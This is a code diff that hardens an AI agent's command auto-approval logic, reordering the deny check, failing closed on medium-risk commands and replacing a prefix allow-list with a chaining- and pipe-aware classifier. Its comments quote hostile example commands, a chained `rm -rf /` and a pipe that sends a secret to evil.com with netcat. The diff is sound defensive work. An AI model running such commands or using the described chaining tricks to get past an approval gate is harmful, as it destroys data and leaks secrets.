@@ -48,12 +48,10 @@ export class AutoApprovalBackend implements ApprovalBackend {
       return { approved: true };
     }
 
-    // Auto-approve common safe patterns
-    if (this.isSafeOperation(req)) {
-      return { approved: true };
-    }
-
-    // Auto-deny high-risk dangerous commands
+    // Deny gate runs BEFORE the safe-prefix fast-path: a high-risk command
+    // must never be auto-approved just because it begins with a "safe" verb
+    // (e.g. `mkdir /tmp && rm -rf /`). The classifier already flagged it
+    // dangerous; honor that first.
     if (req.riskLevel === "high") {
       if (this.delegate) {
         return this.delegate.requestApproval(req);
@@ -64,11 +62,23 @@ export class AutoApprovalBackend implements ApprovalBackend {
       };
     }
 
-    // Medium risk: delegate if available, otherwise approve
+    // Auto-approve common safe patterns (only reachable for low/medium risk).
+    if (this.isSafeOperation(req)) {
+      return { approved: true };
+    }
+
+    // Medium risk that is NOT an established-safe operation: delegate if
+    // available, otherwise fail CLOSED (matching the high-risk branch and the
+    // "auto = approve safe operations only" contract). Auto-approving here
+    // would silently run unvetted commands like `kill`, `npm publish`, or
+    // unknown binaries.
     if (this.delegate) {
       return this.delegate.requestApproval(req);
     }
-    return { approved: true };
+    return {
+      approved: false,
+      reason: "auto mode: medium-risk operation denied (no interactive approval available)",
+    };
   }
 
   private isSafeOperation(req: ApprovalRequest): boolean {
@@ -87,42 +97,15 @@ export class AutoApprovalBackend implements ApprovalBackend {
       }
     }
 
-    // Safe bash commands
+    // Safe bash commands. Reuse the metacharacter-aware classifier instead of
+    // a naive startsWith() prefix match — the latter only inspects the first
+    // token and is blind to command chaining (`&&`/`||`/`;`), substitution,
+    // redirection, and pipe-to-shell, so `mkdir /tmp && rm -rf /` would slip
+    // through. classifyBashCommand/scanShellCommand handle all of those.
     if (toolName === "Bash") {
       const cmd = String(args.command ?? "");
-      const safePrefixes = [
-        "git ",
-        "npm ",
-        "pnpm ",
-        "yarn ",
-        "npx ",
-        "node ",
-        "tsc ",
-        "eslint ",
-        "prettier ",
-        "vitest ",
-        "jest ",
-        "cargo ",
-        "go ",
-        "python ",
-        "pip ",
-        "make ",
-        "ls ",
-        "cat ",
-        "head ",
-        "tail ",
-        "wc ",
-        "echo ",
-        "mkdir ",
-        "touch ",
-        "pwd",
-        "whoami",
-        "date",
-        "which ",
-      ];
-      if (safePrefixes.some((p) => cmd.startsWith(p))) {
-        return true;
-      }
+      const level = classifyBashCommand(cmd);
+      return level === "safe-read" || level === "safe-write";
     }
 
     return false;
@@ -513,19 +496,31 @@ function scanShellCommand(input: string): ScanResult {
 
 function classifySegment(segment: string): BashSafetyLevel {
   if (DANGEROUS_PATTERNS.some((p) => p.test(segment))) return "dangerous";
-  if (SAFE_READ_PATTERNS.some((p) => p.test(segment))) return "safe-read";
-  if (SAFE_WRITE_PATTERNS.some((p) => p.test(segment))) return "safe-write";
 
-  // Pipe handling within a segment: every command in the pipe must
-  // independently classify as safe-read for the segment to count as
-  // safe-read. We did not split on `|` in the scanner because pipes
-  // are not statement boundaries; they're per-segment data flow.
+  // Pipe handling FIRST: every command in the pipe must independently
+  // classify as safe-read for the segment to count as safe-read. This has to
+  // run before the whole-segment SAFE_READ/SAFE_WRITE match below, because
+  // those patterns are head-anchored (e.g. /^echo\s/) and would match
+  // `echo secret | nc evil.com` on its `echo ` head while ignoring the
+  // `| nc ...` exfil tail — declaring a piped-to-network command safe-read.
+  // We did not split on `|` in the scanner because pipes are not statement
+  // boundaries; they're per-segment data flow.
   if (segment.includes("|")) {
+    // A pipe part may be an argument-less command (`ls`, `pwd`) whose trailing
+    // space was stripped along with the `|`. Test each part both as-is (for
+    // `$`-anchored patterns like /^pwd$/) and with a trailing space appended
+    // (for `\s`-delimited patterns like /^ls\s/), so neither form is missed.
     const parts = segment.split("|").map((p) => p.trim());
-    if (parts.every((p) => SAFE_READ_PATTERNS.some((re) => re.test(p)))) {
+    const partIsSafeRead = (p: string) =>
+      SAFE_READ_PATTERNS.some((re) => re.test(p) || re.test(`${p} `));
+    if (parts.every(partIsSafeRead)) {
       return "safe-read";
     }
+    return "unsafe";
   }
+
+  if (SAFE_READ_PATTERNS.some((p) => p.test(segment))) return "safe-read";
+  if (SAFE_WRITE_PATTERNS.some((p) => p.test(segment))) return "safe-write";
   return "unsafe";
 }
 
